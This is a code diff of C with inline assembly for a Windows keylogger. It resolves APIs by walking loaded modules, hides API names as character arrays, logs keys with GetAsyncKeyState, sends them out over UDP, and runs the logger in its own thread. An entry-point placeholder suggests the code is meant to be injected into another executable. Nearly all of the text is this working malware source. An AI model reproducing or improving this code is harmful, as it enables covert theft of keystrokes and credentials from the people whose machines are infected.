@@ -111,13 +111,22 @@ __forceinline LPVOID get_module_by_name(PWCHAR module_name)
 	return NULL;
 }
 
-int main(VOID)
+
+__forceinline void keylogger()
 {
-	WSADATA wsa = { 0 };
-	SOCKET client_socket = NULL;
-	struct sockaddr_in server_address = { 0 };
-	char msg_buf[MAX_MSG_LENGTH] = { 0 };
-	char ws_dll_name[] = { 'W', 's', '2', '_', '3', '2', '.', 'd', 'l', 'l', 0 };
+	PVOID* param; 
+	DWORD tmp;
+	_asm
+	{
+		mov [tmp], eax
+		mov eax, [ebp + 8]
+		mov [param] , eax
+		mov eax, [tmp]
+	}	
+
+	// For debug
+	char message_box_name[] = { 'a', 'b', 'c', 'd', 'e', 'g', 'e', 'B', 'o', 'x', 'A', 0 };
+
 	char WSA_startup_name[] = { 'W', 'S', 'A', 'S', 't', 'a', 'r', 't', 'u', 'p', 0 };
 	char socket_function_name[] = { 's', 'o', 'c', 'k', 'e', 't', 0 };
 	char getAsyncKeyState_name[] = { 'G', 'e', 't', 'A', 's', 'y', 'n', 'c', 'K', 'e', 'y', 'S', 't', 'a', 't', 'e', 0 };
@@ -125,42 +134,58 @@ int main(VOID)
 	char inet_addr_name[] = { 'i', 'n', 'e', 't', '_', 'a', 'd', 'd', 'r', 0 };
 	char sendto_name[] = { 's', 'e', 'n', 'd', 't', 'o', 0 };
 	char server_ip[] = { '1', '2', '7', '.', '0', '.', '0', '.', '1', 0 };
+	char create_thread_name[] = { 'C', 'r', 'e', 'a', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 0 };
 
-	char msg_box_content[] = { 'e','x','p','l','o','r','e','r','.','e','x','e',0 };
+	WCHAR msg_box_content[] = { 'e','x','p','l','o','r','e','r','.','e','x','e',0 };
 	char user32_dll_name[] = { 'u', 's', 'e', 'r', '3','2','.','d','l','l', 0 };
 	char load_library_name[] = { 'l', 'o', 'a', 'd', 'l', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0 };
 	char get_proc_address_name[] = { 'g', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', 0 };
 	WCHAR kernel32_dll_name[] = { 'K', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0 };
+	WSADATA wsa;
+	SOCKET client_socket = NULL;
+	struct sockaddr_in server_address = { 0 };
+	char msg_buf[MAX_MSG_LENGTH];
+
 	HMODULE kernel32_dll = NULL;
 	HMODULE user32_dll = NULL;
 	HMODULE ws_dll = NULL;
 
+	HMODULE(WINAPI * M_loadLibraryA)(_In_opt_ LPCSTR lpLibFileName) = *param;
+	FARPROC(WINAPI * M_getProcAddress)(_In_opt_ HMODULE hModule, _In_opt_ LPCSTR lProcName) = *(param + 1);
+	kernel32_dll = *(param + 2);
+	user32_dll = *(param + 3);
+	ws_dll = *(param + 4);
+
 	// Get kernel32.dll
-	kernel32_dll = get_module_by_name(kernel32_dll_name);
-	if (kernel32_dll == NULL)
-		goto end;
+	//kernel32_dll = M_loadLibraryA(kernel32_dll_name);
+	//if (kernel32_dll == NULL)
+	//	stuck_thread();
 
-	// Get load library function.
-	HMODULE(WINAPI * M_loadLibraryA)(_In_opt_ LPCSTR lpLibFileName) =
-		(HMODULE(WINAPI*)(_In_opt_ LPCSTR)) get_func_by_name(kernel32_dll, load_library_name);
-	if (M_loadLibraryA == NULL)
-		goto end;
+	//// Get load library function.
+	//HMODULE(WINAPI * M_loadLibraryA)(_In_opt_ LPCSTR lpLibFileName) =
+	//	(HMODULE(WINAPI*)(_In_opt_ LPCSTR)) get_func_by_name(kernel32_dll, load_library_name);
+	//if (M_loadLibraryA == NULL)
+	//	goto end;
 
-	// Get getProcAddress's 
-	FARPROC(WINAPI * M_getProcAddress)(_In_opt_ HMODULE hModule, _In_opt_ LPCSTR lProcName) =
-		(FARPROC(WINAPI*)(_In_opt_ HMODULE, _In_opt_ LPCSTR)) get_func_by_name(kernel32_dll, get_proc_address_name);
-	if (M_getProcAddress == NULL)
-		goto end;
+	//// Get getProcAddress's 
+	//FARPROC(WINAPI * M_getProcAddress)(_In_opt_ HMODULE hModule, _In_opt_ LPCSTR lProcName) =
+	//	(FARPROC(WINAPI*)(_In_opt_ HMODULE, _In_opt_ LPCSTR)) get_func_by_name(kernel32_dll, get_proc_address_name);
+	//if (M_getProcAddress == NULL)
+	//	goto end;
 
 	// Get user32.dll
-	user32_dll = M_loadLibraryA(user32_dll_name);
-	if (user32_dll == NULL)
-		goto end;
+	//user32_dll = M_loadLibraryA(user32_dll_name);
+	//if (user32_dll == NULL)
+	//	stuck_thread();
 
-	// Get windows socket dll
-	ws_dll = M_loadLibraryA(ws_dll_name);
-	if (ws_dll == NULL)
-		goto end;
+	//// Get windows socket dll
+	//ws_dll = M_loadLibraryA(ws_dll_name);
+	//if (ws_dll == NULL)
+	//	goto end;
+
+	DWORD(WINAPI * M_messageBoxA)(_In_opt_ HWND hwnd, _In_opt_ LPCSTR lpText, _In_opt_ LPCSTR lpCaption, _In_ UINT uType) = *(param + 5);
+	//	(int (WINAPI*)(_In_opt_ HWND, _In_opt_ LPCSTR, _In_opt_ LPCSTR, _In_ UINT)) M_getProcAddress(user32_dll, message_box_name);
+	M_messageBoxA(NULL, param+6, param+6, 0);
 
 	// Get M_WSAStartup function.
 	int (WINAPI * M_WSAStartup)(WORD wVersionRequired, _Out_opt_ LPWSADATA lpWSAData) =
@@ -242,11 +267,130 @@ int main(VOID)
 		// Reset buffer after sending message.
 		key_counter = 0;
 	}
+end:
+	return;
+}
 
+int main(VOID)
+{
+	char message_box_name[] = { 'M', 'e', 's', 's', 'a', 'g', 'e', 'B', 'o', 'x', 'A', 0 };
+	char first_signal[] = { 'f', 'i', 'r', 's', 't', 0 };
+
+	char ws_dll_name[] = { 'W', 's', '2', '_', '3', '2', '.', 'd', 'l', 'l', 0 };
+	char virtual_alloc_name[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 0 };
+	char create_thread_name[] = { 'C', 'r', 'e', 'a', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 0 };
+	char user32_dll_name[] = { 'u', 's', 'e', 'r', '3','2','.','d','l','l', 0 };
+	char load_library_name[] = { 'l', 'o', 'a', 'd', 'l', 'i', 'b', 'r', 'a', 'r', 'y', 'A', 0 };
+	char get_proc_address_name[] = { 'g', 'e', 't', 'P', 'r', 'o', 'c', 'A', 'd', 'd', 'r', 'e', 's', 's', 0 };
+	WCHAR kernel32_dll_name[] = { 'K', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0 };
+	HMODULE kernel32_dll = NULL;
+	HMODULE user32_dll = NULL;
+	HMODULE ws_dll = NULL;
+	HANDLE(WINAPI * M_CreateThread)(_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes, _In_opt_ SIZE_T dwStackSize,
+		_In_opt_ LPTHREAD_START_ROUTINE lpStartAddress, _In_opt_ __drv_aliasesMem LPVOID lpParameter,
+		_In_opt_ DWORD dwCreateionFlags, _Out_opt_ LPDWORD lpThreadId);
+	PVOID thread_start_address = NULL;
+
+	// Get kernel32.dll
+	kernel32_dll = get_module_by_name(kernel32_dll_name);
+	if (kernel32_dll == NULL)
+		goto end;
+
+	// Get load library function.
+	HMODULE(WINAPI * M_loadLibraryA)(_In_opt_ LPCSTR lpLibFileName) =
+		(HMODULE(WINAPI*)(_In_opt_ LPCSTR)) get_func_by_name(kernel32_dll, load_library_name);
+	if (M_loadLibraryA == NULL)
+		goto end;
+
+	// Get getProcAddress's 
+	FARPROC(WINAPI * M_getProcAddress)(_In_opt_ HMODULE hModule, _In_opt_ LPCSTR lProcName) =
+		(FARPROC(WINAPI*)(_In_opt_ HMODULE, _In_opt_ LPCSTR)) get_func_by_name(kernel32_dll, get_proc_address_name);
+	if (M_getProcAddress == NULL)
+		goto end;
+
+	// Get virtualAlooc function.
+	LPVOID(WINAPI * M_virtualAlloc)(_In_opt_ LPVOID lpAddress, _In_opt_ SIZE_T dwSize, _In_opt_ DWORD flAllocationType, _In_opt_ DWORD flProtect)
+		= (LPVOID(WINAPI*)(_In_opt_ LPVOID, _In_opt_ SIZE_T, _In_opt_ DWORD, _In_opt_ DWORD)) M_getProcAddress(kernel32_dll, virtual_alloc_name);
+	if (M_virtualAlloc == NULL)
+		goto end;
+
+	user32_dll = M_loadLibraryA(user32_dll_name);
+	if (user32_dll == NULL)
+		goto end;
+
+	ws_dll = M_loadLibraryA(ws_dll_name);
+	if (ws_dll == NULL)
+		goto end;
+
+	DWORD(WINAPI * M_messageBoxA)(_In_opt_ HWND hwnd, _In_opt_ LPCSTR lpText, _In_opt_ LPCSTR lpCaption, _In_ UINT uType) =
+		(int (WINAPI*)(_In_opt_ HWND, _In_opt_ LPCSTR, _In_opt_ LPCSTR, _In_ UINT)) M_getProcAddress(user32_dll, message_box_name);
+	M_messageBoxA(NULL, first_signal, first_signal, 0);
+
+	// pass to key logger getProcAddress and all the dlls address. to do that I allocate memory at the process heap.
+	// Different threads at the same process share same memory.
+	LPVOID* keylogger_thread_param = M_virtualAlloc(NULL, sizeof(PVOID) * 7, MEM_COMMIT, PAGE_READWRITE);
+	CHAR* string_input = keylogger_thread_param + 6;
+	*keylogger_thread_param = M_loadLibraryA;
+	*(keylogger_thread_param + 1) = M_getProcAddress;
+	*(keylogger_thread_param + 2) = kernel32_dll;
+	*(keylogger_thread_param + 3) = user32_dll;
+	*(keylogger_thread_param + 4) = ws_dll;
+	*(keylogger_thread_param + 5) = M_messageBoxA;
+	*string_input = 'g';
+	*(string_input + 1) = 'u';
+	*(string_input + 2) = 'y';
+	*(string_input + 3) = 0;
+
+	DWORD tmp2 = 0;
+	_asm
+	{
+		// inline relative call to label.
+		call get_current_ip
+		get_current_ip :
+		mov [tmp2], eax
+		pop eax
+			//add eax, key_logger_start
+			//sub eax, get_current_ip
+			add eax, 24
+			mov[thread_start_address], eax
+			mov eax, [tmp2]
+			key_logger_start:
+	}
+	goto create_thread;
+	// Start of new thread.
+	keylogger();
+
+	// Could be accessed only by jump or goto.
+	if (0)
+	{
+		//_asm
+		//{
+		//	// Get call to keylogger address. 
+		//	pop eax
+		//	mov [thread_start_address], eax
+		//}
+	create_thread:
+		// Get CreateThread function.
+		M_CreateThread =
+			(HANDLE(WINAPI*)(_In_opt_ LPSECURITY_ATTRIBUTES, _In_opt_ SIZE_T,
+				_In_opt_ LPTHREAD_START_ROUTINE, _In_opt_ __drv_aliasesMem LPVOID,
+				_In_opt_ DWORD, _Out_opt_ LPDWORD)) M_getProcAddress(kernel32_dll, create_thread_name);
+		if (M_CreateThread == NULL)
+			goto end;
+
+		M_CreateThread(NULL, 0, thread_start_address, keylogger_thread_param, 0, NULL);
+	}	
 
 end:
 	_asm
 	{
 		mov eax, ORIGINAL_ENTERY_ADDRESS_PLACE_HOLDER
 	}
+	
+	int counter = 0;
+	while (1)
+	{
+		counter++;
+	//	printf("%d", counter);
+	};
 }
